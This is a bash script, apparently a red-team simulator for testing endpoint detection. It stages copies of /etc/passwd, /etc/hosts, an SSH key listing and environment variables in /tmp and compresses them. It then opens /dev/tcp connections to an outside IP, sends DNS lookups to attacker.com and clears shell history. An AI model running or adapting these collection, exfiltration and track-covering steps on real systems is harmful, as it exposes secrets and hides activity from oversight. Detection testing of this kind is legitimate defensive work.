#!/bin/bash
# Data Exfiltration Simulator
# Simulates data theft and exfiltration patterns

echo "📤 Data Exfiltration Simulator"
echo "=============================="
echo ""

EXFIL_DIR="/tmp/exfil_staging_$$"
mkdir -p "$EXFIL_DIR"

# Phase 1: Data collection
echo "[Phase 1] Collecting sensitive data..."

echo "  → Reading /etc/passwd"
cp /etc/passwd "$EXFIL_DIR/passwd.txt"
sleep 1

echo "  → Reading /etc/hosts"
cp /etc/hosts "$EXFIL_DIR/hosts.txt"
sleep 1

echo "  → Searching for SSH keys"
find ~/.ssh -type f 2>/dev/null | head -5 > "$EXFIL_DIR/ssh_keys_list.txt"
sleep 1

echo "  → Collecting environment variables"
env > "$EXFIL_DIR/environment.txt"
sleep 1

echo "  → Listing home directory"
ls -la ~ > "$EXFIL_DIR/home_listing.txt"
sleep 1

# Phase 2: Data compression
echo ""
echo "[Phase 2] Compressing stolen data..."
tar -czf "$EXFIL_DIR/stolen_data.tar.gz" -C "$EXFIL_DIR" . 2>/dev/null
sleep 1

# Phase 3: Simulated network exfiltration
echo ""
echo "[Phase 3] Simulating data exfiltration..."

echo "  → Attempting connection to attacker server (8.8.8.8:80)"
timeout 2 bash -c 'cat < /dev/tcp/8.8.8.8/80' 2>/dev/null || echo "     Connection attempt made"
sleep 1

echo "  → Attempting DNS exfiltration"
for i in {1..3}; do
    nslookup "data$i.attacker.com" 8.8.8.8 2>/dev/null || echo "     DNS query sent"
    sleep 0.5
done

echo "  → Attempting HTTPS exfiltration"
timeout 2 bash -c 'cat < /dev/tcp/8.8.8.8/443' 2>/dev/null || echo "     HTTPS connection attempt made"
sleep 1

# Phase 4: Cover tracks
echo ""
echo "[Phase 4] Covering tracks..."
echo "  → Clearing bash history (simulation)"
history -c 2>/dev/null || echo "     History clear attempted"
sleep 1

# Calculate "exfiltrated" data size
TOTAL_SIZE=$(du -sh "$EXFIL_DIR" 2>/dev/null | cut -f1)

echo ""
echo "✅ Data exfiltration simulation completed"
echo ""
echo "📊 Statistics:"
echo "   - Files collected: $(find $EXFIL_DIR -type f | wc -l)"
echo "   - Total data size: $TOTAL_SIZE"
echo "   - Network connections: 5 attempts"
echo ""
echo "🚨 Expected EDR Detections:"
echo "   - HIGH: Sensitive file access (/etc/passwd, SSH keys)"
echo "   - HIGH: Large data transfer pattern"
echo "   - MEDIUM: Multiple network connections"
echo "   - HIGH: Data staging in /tmp"
echo ""
echo "🧹 Cleanup: rm -rf $EXFIL_DIR"
